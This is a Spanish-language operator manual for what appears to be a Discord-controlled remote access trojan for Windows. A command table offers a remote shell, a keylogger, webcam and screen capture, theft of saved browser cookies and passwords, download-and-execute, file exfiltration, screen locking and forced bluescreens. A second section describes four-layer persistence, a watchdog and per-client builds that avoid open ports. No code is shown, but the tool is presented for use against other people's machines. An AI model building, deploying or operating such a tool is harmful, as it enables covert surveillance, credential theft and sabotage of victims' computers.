# Comandos

Se ejecutan en el canal de sesión del equipo y responden ahí.

| Comando | Qué hace | Para qué |
|---|---|---|
| `/shell <cmd>` | Ejecuta en `cmd.exe` y devuelve la salida. | Todo lo que no tiene comando propio. |
| `/screenshot` | Captura el escritorio. | Ver qué hay en pantalla. |
| `/sysinfo` | Hostname, usuario, IP, Windows, privilegios. | Primera foto del equipo. |
| `/ps list` | Lista procesos con PID y memoria. | Ver qué corre encima. |
| `/ps kill <pid>` | Mata el proceso y sus hijos. | Quitar lo que estorba. |
| `/keylog start` | Reengancha el keylogger si lo detuviste. | Captura activa sin reiniciar. |
| `/keylog stop` | Lo detiene hasta el próximo arranque. | Cortar la captura en caliente. |
| `/keylog dump` | Publica lo capturado desde el último dump. | Extraer el log, sin pasar por start. |
| `/download <ruta>` | Sube un archivo o carpeta comprimida. | Sacar lo que interesa. |
| `/upload <url>` | Descarga y opcionalmente ejecuta. | Meter una herramienta. |
| `/clip get` | Lee el portapapeles. | Recuperar lo último copiado. |
| `/clip set <texto>` | Escribe el portapapeles. | Dejar algo listo para pegar. |
| `/msgbox <título> <texto> [icono]` | Abre un aviso en pantalla. | Hablar con quien está delante. |
| `/webcam` | Captura un frame de la cámara. | Ver quién está. |
| `/passwords` | Cookies y contraseñas de Chrome, Edge y Brave. | Entrar sin pasar por login. |
| `/lockscreen on [min]` | Cortina negra, teclado y ratón bloqueados. | Congelar la máquina. |
| `/lockscreen off` | Levanta la cortina. | Devolver el control. |
| `/lockscreen status` | Dice si está activa. | Comprobar el estado. |
| `/elevate` | Pide UAC y relanza como admin. | Todo lo que necesita administrador. |
| `/bsod [diagnostico]` | Fuerza un bugcheck. | Apagar sin cierre limpio. |
| `/kill` | Apaga el agente hasta el próximo arranque. | Silenciarlo un rato. |
| `/shutdown` | Apaga el agente y borra la persistencia. | Retirada limpia. |

El panel publica quince botones con las mismas acciones.

## El agente

- **Una instancia por equipo**, garantizada con mutex. Las copias sobrantes salen solas.
- **Un canal `sesion-N`** por equipo en la guild. Ahí vive el panel y ahí se responde.
- **Cuatro capas de persistencia**: RunKey, tarea de logon, tarea de arranque como SYSTEM y servicio. Un watchdog revisa cada minuto y relanza si falta.
- **Reconexión** con espera creciente, más watchdog de red para la sesión zombi.
- **Identidad propia** por cliente: nombre, servicio, tareas, registro y carpeta salen de `internal/config` y se fijan al compilar con `-ldflags -X`.
- **Sin puertos abiertos**: todo sale hacia el gateway y el webhook.
- **Una aplicación de Discord por cliente**: dos agentes con el mismo token se expulsan.
